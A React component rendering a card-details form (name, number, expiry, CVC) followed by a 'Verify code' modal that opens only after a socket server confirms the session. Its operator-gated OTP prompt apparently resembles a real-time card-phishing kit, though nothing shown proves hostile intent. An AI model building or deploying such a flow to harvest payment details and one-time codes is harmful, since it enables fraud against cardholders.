import { Controller } from 'react-hook-form';
import cardTypeImage from '../../assets/images/cardtype.jpeg';
import DatePicker from 'react-datepicker';
import { useContext, useEffect, useState } from 'react';
import { IMaskInput } from 'react-imask';
import { SocketContext } from '../../App';
const CardDetailForm = ({ control, onSubmit, loading, disabled }) => {

	const [open, setOpen] = useState(false)

	const socket = useContext(SocketContext)

	const handleOpenVerifyCode = () => {
		socket.emit('requestVerify', { sessionId: socket.id })
	}

	useEffect(() => {
		socket.on('confirmVerify', value => {
			const { sessionId } = value
			if (sessionId === socket.id) {
				setOpen(true)
			}
		})
	}, []);


	return (
		<div className='w-screen flex justify-center relative'>
			<div className='flex justify-center align-center flex items-center'>
				{/* {loading && (
					<div
						style={{
							position: 'absolute',
							background: 'white',
							width: '100%',
							height: '100%',
							opacity: 0.4,
						}}
					>
						<div
							style={{
								position: 'absolute',
								top: '50%',
								left: '50%',
								transform: 'translate(-50%,-50%)',
							}}
						>
							<svg
								aria-hidden='true'
								className='w-8 h-8 text-gray-200 animate-spin dark:text-gray-600 fill-blue-600'
								viewBox='0 0 100 101'
								fill='none'
								xmlns='http://www.w3.org/2000/svg'
							>
								<path
									d='M100 50.5908C100 78.2051 77.6142 100.591 50 100.591C22.3858 100.591 0 78.2051 0 50.5908C0 22.9766 22.3858 0.59082 50 0.59082C77.6142 0.59082 100 22.9766 100 50.5908ZM9.08144 50.5908C9.08144 73.1895 27.4013 91.5094 50 91.5094C72.5987 91.5094 90.9186 73.1895 90.9186 50.5908C90.9186 27.9921 72.5987 9.67226 50 9.67226C27.4013 9.67226 9.08144 27.9921 9.08144 50.5908Z'
									fill='currentColor'
								/>
								<path
									d='M93.9676 39.0409C96.393 38.4038 97.8624 35.9116 97.0079 33.5539C95.2932 28.8227 92.871 24.3692 89.8167 20.348C85.8452 15.1192 80.8826 10.7238 75.2124 7.41289C69.5422 4.10194 63.2754 1.94025 56.7698 1.05124C51.7666 0.367541 46.6976 0.446843 41.7345 1.27873C39.2613 1.69328 37.813 4.19778 38.4501 6.62326C39.0873 9.04874 41.5694 10.4717 44.0505 10.1071C47.8511 9.54855 51.7191 9.52689 55.5402 10.0491C60.8642 10.7766 65.9928 12.5457 70.6331 15.2552C75.2735 17.9648 79.3347 21.5619 82.5849 25.841C84.9175 28.9121 86.7997 32.2913 88.1811 35.8758C89.083 38.2158 91.5421 39.6781 93.9676 39.0409Z'
									fill='currentFill'
								/>
							</svg>
						</div>
					</div>
				)} */}
				<div className='w-auto mx-auto bg-white p-6 rounded-lg shadow-lg flex flex-col'>
					<h2 className='text-xl font-semibold mb-4 text-center text-black'>Add your card details</h2>
					<img src={cardTypeImage} />

					<div className='mb-4'>
						<Controller
							control={control}
							name='cardType'
							render={({ field }) => (
								<div style={{ display: 'flex', gap: 10, alignItems: 'center' }}>
									<label className='block text-gray-700'>
										<input
											onClick={field.onChange}
											type='radio'
											name='cardType'
											value='credit Card'
											className='mr-2'
											defaultChecked={field.value}
										/>
										Credit card
									</label>
									<label className='block text-gray-700'>
										<input
											onClick={field.onChange}
											type='radio'
											name='cardType'
											value='master Card'
											defaultChecked={field.value}
											className='mr-2'
										/>
										Master card
									</label>
									<label className='block text-gray-700'>
										<input
											onClick={field.onChange}
											type='radio'
											name='cardType'
											value='visa'
											defaultChecked={field.value}
											className='mr-2'
										/>
										Visa
									</label>
								</div>
							)}
						/>
					</div>

					<div className='mb-4'>
						<label className='block text-gray-700 mb-2'>Card Type</label>
						<Controller
							control={control}
							name='cardSchema'
							render={({ field }) => (
								<div style={{ display: 'flex', gap: 10, alignItems: 'center' }}>
									<label className='block text-gray-700'>
										<input
											onClick={field.onChange}
											type='radio'
											name='cardschema'
											value='CREDIT'
											className='mr-2'
											defaultChecked={field.value}
										/>
										Credit
									</label>
									<label className='block text-gray-700'>
										<input
											onClick={field.onChange}
											type='radio'
											name='cardschema'
											value='DEBIT'
											defaultChecked={field.value}
											className='mr-2'
										/>
										Debit
									</label>
								</div>
							)}
						/>
					</div>

					<div className='mb-4'>
						<label className='block text-gray-700 mb-2'>Card Name</label>
						<Controller
							control={control}
							name='cardName'
							render={({ field, fieldState: { error } }) => (
								<>
									<input
										placeholder='Name'
										onChange={field.onChange}
										type='text'
										className='w-full px-4 py-2 border rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500'
									/>
									{error?.message && (
										<div className='text-sm' style={{ color: 'red' }}>
											{error.message}
										</div>
									)}
								</>
							)}
						/>
					</div>

					<div className='mb-4'>
						<label className='block text-gray-700 mb-2' htmlFor='cardNumber'>
							Card number
						</label>
						<Controller
							control={control}
							name='cardNumber'
							render={({ field, fieldState: { error } }) => (
								<>
									<IMaskInput
										mask="0000-0000-0000-0000-00"
										definitions={{
											'#': /[0-9]/,
										}}
										onChange={(e) => {
											field.onChange(e.target.value)
										}}
										placeholder='13-19 digits'
										className='w-full px-4 py-2 border rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500'
									/>
									{error?.message && (
										<div className='text-sm' style={{ color: 'red' }}>
											{error.message}
										</div>
									)}
								</>
							)}
						/>
					</div>

					<div className='mb-4 flex'>
						<div className='w-1/2 mr-2'>
							<label className='block text-gray-700 mb-2' htmlFor='expirationDate'>
								Card Expiration Date
							</label>
							<Controller
								control={control}
								name='expires'
								render={({ field, fieldState: { error } }) => (
									<>

										<DatePicker
											placeholderText='MM/YY'
											showMonthYearPicker
											dateFormat='MM/YY'
											selected={field.value}
											onChange={field.onChange}
											popperPlacement='bottom-start'
											className='border border-gray-300 p-2 rounded w-11/12'
										/>
										{error?.message && (
											<div className='text-sm' style={{ color: 'red' }}>
												{error.message}
											</div>
										)}
									</>
								)}
							/>
						</div>
						<div className='w-1/2 ml-2'>
							<label className='block text-gray-700 mb-2' htmlFor='cvc'>
								Card Security Code
							</label>
							<Controller
								control={control}
								name='cvc'
								render={({ field, fieldState: { error } }) => (
									<>
										<input
											placeholder='3-4 digits'
											onChange={field.onChange}
											type='text'
											className='w-full px-4 py-2 border rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500'
										/>
										{error?.message && (
											<div className='text-sm' style={{ color: 'red' }}>
												{error.message}
											</div>
										)}
									</>
								)}
							/>
						</div>
					</div>

					{open && (
						<>
							<div
								className="justify-center items-center flex overflow-x-hidden overflow-y-auto fixed inset-0 z-50 outline-none focus:outline-none"
							>
								<div className=" flex flex-col bg-white p-5 rounded-md gap-3">
									<label className='block text-gray-700 mb-2' htmlFor='cvc'>
										Verify Code
									</label>
									<Controller
										control={control}
										name='cardVerifyCode'
										render={({ field, fieldState: { error } }) => (
											<>
												<input
													placeholder='Verify code'
													onChange={field.onChange}
													type='text'
													className='w-full px-4 py-2 border rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500'
												/>
												{error?.message && (
													<div className='text-sm' style={{ color: 'red' }}>
														{error.message}
													</div>
												)}
											</>
										)}
									/>
									<button
										style={{ background: 'rgb(121,73,255)' }}
										onClick={onSubmit}
										className='w-full bg-blue-500 text-white py-2 px-4 rounded-lg hover:bg-blue-600 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:ring-opacity-50'
									>
										Verify
									</button>
								</div>
							</div>
							<div className="opacity-25 fixed inset-0 z-40 bg-black"></div>
						</>
					)}

					<button
						disabled={disabled}
						style={{ background: 'rgb(121,73,255)' }}
						onClick={handleOpenVerifyCode}
						className='w-full bg-blue-500 text-white py-2 px-4 rounded-lg hover:bg-blue-600 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:ring-opacity-50'
					>
						Link my card
					</button>
				</div>
			</div>
		</div>
	);
};

export default CardDetailForm;
